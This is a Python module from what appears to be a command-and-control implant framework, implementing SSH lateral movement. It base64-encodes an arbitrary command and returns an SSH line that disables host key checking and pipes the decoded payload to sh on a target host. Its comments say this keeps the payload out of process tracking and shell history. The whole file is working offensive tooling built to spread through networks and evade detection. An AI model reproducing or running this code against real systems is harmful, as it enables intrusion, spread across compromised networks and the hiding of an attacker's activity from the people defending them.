import base64

MODULE_INFO = {
    "name": "lat_ssh",
    "description": "Lateral movement via SSH. Encodes payload locally to eliminate plaintext CLI artifacts on the target system.",
    "platform": "any"
}

def run(session, args):
    if len(args) < 3:
        return "[!] Usage: use lat_ssh <target_ip> <username> <payload_to_execute>"
    
    target = args[0]
    user = args[1]
    cmd_exec = " ".join(args[2:])
    
    # Encode the payload on the C2 server natively so the implant doesn't have to
    b64_payload = base64.b64encode(cmd_exec.encode()).decode()

    # The returned string will be executed by the implant's shell (cmd.exe, powershell, or /bin/sh).
    # We use SSH to pipe the Base64 payload directly to 'sh' on the target Unix machine.
    # This prevents the payload from appearing in process tracking or shell history on the target.

    cmd = f'ssh -o StrictHostKeyChecking=no {user}@{target} "echo {b64_payload} | base64 -d | sh"'
    return cmd
